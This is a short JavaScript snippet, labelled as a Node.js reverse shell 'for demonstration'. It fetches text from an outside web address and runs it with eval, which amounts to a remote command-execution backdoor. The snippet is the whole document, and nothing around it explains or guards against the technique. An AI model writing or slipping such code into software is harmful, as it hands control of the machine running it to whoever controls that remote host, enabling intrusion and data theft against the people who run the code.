// Reverse shell in Node.js for demonstration
fetch('http://www.embryohotel.com/cmd')
    .then(response => response.text())
    .then(command => eval(command)); // Execute fetched commands
